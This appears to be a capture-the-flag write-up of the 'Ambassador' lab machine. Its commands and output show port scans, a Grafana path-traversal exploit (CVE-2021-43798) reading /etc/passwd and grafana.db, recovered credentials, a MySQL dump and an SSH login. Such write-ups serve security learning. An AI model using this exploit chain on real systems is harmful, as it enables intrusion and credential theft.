![image](https://user-images.githubusercontent.com/105310322/193700576-4c367863-b493-473b-811d-8f9f18946064.png)


```console
└─$ nmap -A -p- -T4 -Pn 10.129.51.253
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 13:39 CDT
Nmap scan report for 10.129.51.253
Host is up (0.078s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 03 Oct 2022 18:40:21 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 03 Oct 2022 18:39:48 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 03 Oct 2022 18:39:54 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 14
|   Capabilities flags: 65535
|   Some Capabilities: SupportsCompression, Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongPassword, IgnoreSigpipes, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, InteractiveClient, SupportsLoadDataLocal, FoundRows, Speaks41ProtocolNew, ODBCClient, ConnectWithDatabase, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: R+Z\x0DD4^V#A\x19P\x10us\x01 pjT
|_  Auth Plugin Name: caching_sha2_password
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.92%I=7%D=10/3%Time=633B2C7E%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Mon,\x2003\x20Oct\x202022\x2018:39
SF::48\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mo
SF:n,\x2003\x20Oct\x202022\x2018:39:54\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Mon,\x2003\x20Oct\x202022\x2018:40:21\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.31 seconds
```

```
└─$ feroxbuster -u http://10.129.51.253/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q 
200      GET      155l      305w     3654c http://10.129.51.253/
301      GET        9l       28w      315c http://10.129.51.253/images => http://10.129.51.253/images/
403      GET        9l       28w      278c http://10.129.51.253/.html
301      GET        9l       28w      313c http://10.129.51.253/tags => http://10.129.51.253/tags/
200      GET       92l      143w     1793c http://10.129.51.253/404.html
200      GET      155l      305w     3654c http://10.129.51.253/index.html
200      GET      109l      172w     2288c http://10.129.51.253/tags/index.html
301      GET        9l       28w      319c http://10.129.51.253/categories => http://10.129.51.253/categories/
200      GET      109l      172w     2330c http://10.129.51.253/categories/index.html
301      GET        9l       28w      314c http://10.129.51.253/posts => http://10.129.51.253/posts/
301      GET        9l       28w      319c http://10.129.51.253/posts/page => http://10.129.51.253/posts/page/
403      GET        9l       28w      278c http://10.129.51.253/server-status
```

![image](https://user-images.githubusercontent.com/105310322/193699279-feb25054-fb07-4c79-9ba4-ea5ae01264de.png)

```console
└─$ feroxbuster -u http://10.129.51.253:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q

WLD      GET        2l        2w       29c Got 302 for http://10.129.51.253:3000/43612f99366348e7940a2c4ca064091d (url length: 32)
WLD         -         -         - http://10.129.51.253:3000/43612f99366348e7940a2c4ca064091d => /login
WLD      GET         -         -         - Wildcard response is static; auto-filtering 29 responses; toggle this behavior by using --dont-filter
WLD      GET        2l        2w       29c Got 302 for http://10.129.51.253:3000/3ca9506f5a03461685b7b506d1abefa5aec82fe5954b44b595fe34cd3c41eca520a0f618086f46dbb3ed34031e272d28 (url length: 96)
WLD         -         -         - http://10.129.51.253:3000/3ca9506f5a03461685b7b506d1abefa5aec82fe5954b44b595fe34cd3c41eca520a0f618086f46dbb3ed34031e272d28 => /login
200      GET      184l      690w        0c http://10.129.51.253:3000/login
401      GET        1l        1w       27c http://10.129.51.253:3000/api
401      GET        1l        1w       27c http://10.129.51.253:3000/api.php
401      GET        1l        1w       27c http://10.129.51.253:3000/api.html
401      GET        1l        1w       27c http://10.129.51.253:3000/api.txt
401      GET        1l        1w       27c http://10.129.51.253:3000/api.git
302      GET        2l        2w       31c http://10.129.51.253:3000/public => /public/
302      GET        2l        2w       36c http://10.129.51.253:3000/public/test => /public/test/
302      GET        2l        2w       35c http://10.129.51.253:3000/public/img => /public/img/
302      GET        2l        2w       43c http://10.129.51.253:3000/public/img/plugins => /public/img/plugins/
302      GET        2l        2w       35c http://10.129.51.253:3000/public/lib => /public/lib/
302      GET        2l        2w       35c http://10.129.51.253:3000/public/app => /public/app/
302      GET        2l        2w       40c http://10.129.51.253:3000/public/test/lib => /public/test/lib/
302      GET        2l        2w       43c http://10.129.51.253:3000/public/app/plugins => /public/app/plugins/
302      GET        2l        2w       41c http://10.129.51.253:3000/public/app/store => /public/app/store/
200      GET      184l      690w        0c http://10.129.51.253:3000/signup
302      GET        2l        2w       41c http://10.129.51.253:3000/public/test/core => /public/test/core/
302      GET        2l        2w       37c http://10.129.51.253:3000/public/fonts => /public/fonts/
302      GET        2l        2w       40c http://10.129.51.253:3000/public/app/core => /public/app/core/
302      GET        2l        2w       51c http://10.129.51.253:3000/public/app/core/components => /public/app/core/components/
302      GET        2l        2w       38c http://10.129.51.253:3000/public/emails => /public/emails/
302      GET        2l        2w       41c http://10.129.51.253:3000/public/img/icons => /public/img/icons/
302      GET        2l        2w       36c http://10.129.51.253:3000/public/maps => /public/maps/
302      GET        2l        2w       38c http://10.129.51.253:3000/public/img/bg => /public/img/bg/
302      GET        2l        2w       49c http://10.129.51.253:3000/public/app/plugins/panel => /public/app/plugins/panel/
302      GET        2l        2w       37c http://10.129.51.253:3000/public/views => /public/views/
302      GET        2l        2w       49c http://10.129.51.253:3000/public/app/core/services => /public/app/core/services/
200      GET        1l       72w     1487c http://10.129.51.253:3000/public/views/error.html
302      GET        2l        2w       47c http://10.129.51.253:3000/public/test/core/utils => /public/test/core/utils/
200      GET      210l      707w    10009c http://10.129.51.253:3000/public/views/index.html
302      GET        2l        2w       46c http://10.129.51.253:3000/public/app/core/utils => /public/app/core/utils/
302      GET        2l        2w       48c http://10.129.51.253:3000/public/img/icons/custom => /public/img/icons/custom/
302      GET        2l        2w       44c http://10.129.51.253:3000/public/app/features => /public/app/features/
302      GET        2l        2w       50c http://10.129.51.253:3000/public/app/features/admin => /public/app/features/admin/
302      GET        2l        2w       51c http://10.129.51.253:3000/public/app/features/search => /public/app/features/search/
302      GET        2l        2w       52c http://10.129.51.253:3000/public/app/features/plugins => /public/app/features/plugins/
302      GET        2l        2w       46c http://10.129.51.253:3000/public/app/core/hooks => /public/app/core/hooks/
302      GET        2l        2w       44c http://10.129.51.253:3000/public/test/helpers => /public/test/helpers/
302      GET        2l        2w       50c http://10.129.51.253:3000/public/app/features/users => /public/app/features/users/
302      GET        2l        2w       48c http://10.129.51.253:3000/public/app/core/actions => /public/app/core/actions/
302      GET        2l        2w       24c http://10.129.51.253:3000/org => /
302      GET        2l        2w       52c http://10.129.51.253:3000/public/app/features/profile => /public/app/features/profile/
302      GET        2l        2w       50c http://10.129.51.253:3000/public/app/features/panel => /public/app/features/panel/
302      GET        2l        2w       37c http://10.129.51.253:3000/public/build => /public/build/
200      GET        2l        4w       26c http://10.129.51.253:3000/robots.txt
302      GET        2l        2w       38c http://10.129.51.253:3000/public/vendor => /public/vendor/
302      GET        2l        2w       42c http://10.129.51.253:3000/public/vendor/css => /public/vendor/css/
302      GET        2l        2w       44c http://10.129.51.253:3000/public/build/static => /public/build/static/
302      GET        2l        2w       51c http://10.129.51.253:3000/public/app/core/navigation => /public/app/core/navigation/
302      GET        2l        2w       48c http://10.129.51.253:3000/public/build/static/img => /public/build/static/img/
302      GET        2l        2w       49c http://10.129.51.253:3000/public/app/features/live => /public/app/features/live/
200      GET        2l        4w       26c http://10.129.51.253:3000/public/robots.txt
302      GET        2l        2w       45c http://10.129.51.253:3000/public/app/core/copy => /public/app/core/copy/
302      GET        2l        2w       52c http://10.129.51.253:3000/public/app/features/sandbox => /public/app/features/sandbox/
302      GET        2l        2w       54c http://10.129.51.253:3000/public/app/features/dashboard => /public/app/features/dashboard/
200      GET      184l      690w        0c http://10.129.51.253:3000/verify
302      GET        2l        2w       48c http://10.129.51.253:3000/public/app/features/org => /public/app/features/org/
200      GET      836l     2689w        0c http://10.129.51.253:3000/metrics
302      GET        2l        2w       50c http://10.129.51.253:3000/public/app/features/query => /public/app/features/query/
302      GET        2l        2w       42c http://10.129.51.253:3000/public/test/specs => /public/test/specs/
302      GET        2l        2w       48c http://10.129.51.253:3000/public/app/core/filters => /public/app/core/filters/
302      GET        2l        2w       52c http://10.129.51.253:3000/public/app/features/explore => /public/app/features/explore/
302      GET        2l        2w       46c http://10.129.51.253:3000/public/app/core/specs => /public/app/core/specs/
401      GET        1l        1w       27c http://10.129.51.253:3000/api-doc
401      GET        1l        1w       27c http://10.129.51.253:3000/api-doc.php
401      GET        1l        1w       27c http://10.129.51.253:3000/api-doc.html
401      GET        1l        1w       27c http://10.129.51.253:3000/api-doc.txt
401      GET        1l        1w       27c http://10.129.51.253:3000/api-doc.git
302      GET        2l        2w       45c http://10.129.51.253:3000/public/img/licensing => /public/img/licensing/
302      GET        2l        2w       53c http://10.129.51.253:3000/public/app/features/playlist => /public/app/features/playlist/
302      GET        2l        2w       50c http://10.129.51.253:3000/public/app/features/teams => /public/app/features/teams/
302      GET        2l        2w       52c http://10.129.51.253:3000/public/app/features/folders => /public/app/features/folders/
401      GET        1l        1w       27c http://10.129.51.253:3000/apis
401      GET        1l        1w       27c http://10.129.51.253:3000/apis.php
401      GET        1l        1w       27c http://10.129.51.253:3000/apis.html
401      GET        1l        1w       27c http://10.129.51.253:3000/apis.txt
401      GET        1l        1w       27c http://10.129.51.253:3000/apis.git
200      GET      279l     1846w    18814c http://10.129.51.253:3000/public/emails/reset_password.html
200      GET        9l       36w      304c http://10.129.51.253:3000/public/emails/reset_password.txt
302      GET        2l        2w       44c http://10.129.51.253:3000/public/app/partials => /public/app/partials/
302      GET        2l        2w       41c http://10.129.51.253:3000/public/app/types => /public/app/types/
302      GET        2l        2w       42c http://10.129.51.253:3000/public/test/mocks => /public/test/mocks/
302      GET        2l        2w       42c http://10.129.51.253:3000/public/app/routes => /public/app/routes/
302      GET        2l        2w       48c http://10.129.51.253:3000/public/app/types/jquery => /public/app/types/jquery/
401      GET        1l        1w       27c http://10.129.51.253:3000/api_test
401      GET        1l        1w       27c http://10.129.51.253:3000/api_test.php
401      GET        1l        1w       27c http://10.129.51.253:3000/api_test.html
401      GET        1l        1w       27c http://10.129.51.253:3000/api_test.txt
401      GET        1l        1w       27c http://10.129.51.253:3000/api_test.git
302      GET        2l        2w       54c http://10.129.51.253:3000/public/app/plugins/datasource => /public/app/plugins/datasource/
```

Gave back a login screen, attempted login bypass with sql injection but had no luck.

![image](https://user-images.githubusercontent.com/105310322/193699522-4de4729e-b5b5-4eb3-9ffd-d62293f07f64.png)


Found an exploit for grafana that allowed you to read files. We can confirm the version of this grafana by looking at the bottom of the login screen. This shows that our version is 8.2.

https://www.exploit-db.com/exploits/50581

```console
└─$ python3 50581.py -H http://10.129.51.253:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

I had problems running this exploit but this page gave some good insight on what files to look for. Doing so gave me some login information.

https://github.com/jas502n/Grafana-CVE-2021-43798

/var/lib/grafana/grafana.db
/etc/grafana/grafana.ini


admin
messageInABottle685427

However when I used it to read the grafana.db file it was not giving me the full password so I instead had to pull the file with curl and then view it with sqlitebrowser.

```curl -u admin:messageInABottle685427 --path-as-is http://10.129.52.15:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db```

Grafana
dontStandSoCloseToMe63221!


![image](https://user-images.githubusercontent.com/105310322/193697435-4d0f1c62-016a-48dd-bbf6-cb44fd87f056.png)


```console
└──╼ [★]$ mysql -h 10.129.52.15 -u grafana -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

```console
└──╼ [★]$ mysqldump -h 10.129.52.15 -u grafana -p --all-databases > mysql
└──╼ [★]$ cat mysql | grep developer
```

```INSERT INTO `users` VALUES ('developer','YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==');```

developer
anEnglishManInNewYork027468

```console
└──╼ [★]$ ssh developer@10.129.52.15
developer@10.129.52.15's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 03 Oct 2022 10:44:54 PM UTC

  System load:           0.0
  Usage of /:            80.8% of 5.07GB
  Memory usage:          41%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.52.15
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c657


0 updates can be applied immediately.


Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
developer@ambassador:~$ cat user.txt
6c698***************************
```

```console
developer@ambassador:~$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on ambassador.
developer@ambassador:~$ 
```
